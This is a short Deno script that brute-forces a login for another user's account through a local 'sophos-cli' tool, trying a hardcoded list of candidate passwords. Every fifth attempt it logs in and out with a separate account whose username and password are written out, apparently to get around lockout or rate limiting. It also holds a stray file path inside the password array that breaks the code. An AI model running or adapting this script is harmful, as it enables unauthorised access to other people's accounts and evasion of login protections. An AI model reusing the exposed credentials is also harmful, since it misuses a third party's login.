const username_known = "9919103015";
const password_known = "052019UH";

const username_to_find = "9919103003";

const password_list: Array<string> = [
  "157030AR",
  "216031IM",
  "268032SH",
  "185033UM",
  "267037EH",
  "338038RE",
  "323047AI",
  "346048AR",
  "302049IN",
  "357043AR",
  "163044HI",
  "178045HI",
  "005012EH",
  "421013EE",
  "083014EE",
  "419015UL",
  "063016UR",
  "417017AR",
  "053018BH",
  "052019UH",/home/akshat
  "035005IS",
  "087006EH",
  "411007NU",
  "055009RU",
  "045010IS",
  "049001NU",
  "065002AK",
  "416003AS",
  "044005NA",
  "064001AN",
  "412002IT",
  "026003AN",
  "027004OP",
  "008005NU",
  "396006OH",
  "071001HW",
  "019002RI",
  "024003IV",
  "089004NU",
  "427005AJ",
  "424006KS",
  "423007AV",
  "415008UJ",
  "086009IS",
  "073010HR",
  "294042AN",
  "381041OS",
  "199040AS"
];

for (let i = 0; i < password_list.length; ) {
  if ((i + 1) % 5 == 0) {
    let p1 = Deno.run({
      args: [
        "$USER/projects/sophos-cli/target/debug/sophos-cli",
        username_known,
        password_known,
        "login"
      ]
    });
    // await its completion
    await p1.status();
    let p2 = Deno.run({
      args: [
        "$USER/projects/sophos-cli/target/debug/sophos-cli",
        username_known,
        password_known,
        "logout"
      ]
    });
    // await its completion
    await p2.status();
  } else {
    let p = Deno.run({
      args: [
        "$USER/projects/sophos-cli/target/debug/sophos-cli",
        username_to_find,
        password_list[i],
        "login"
      ]
    });
    // await its completion
    await p.status();
    i++;
  }
}
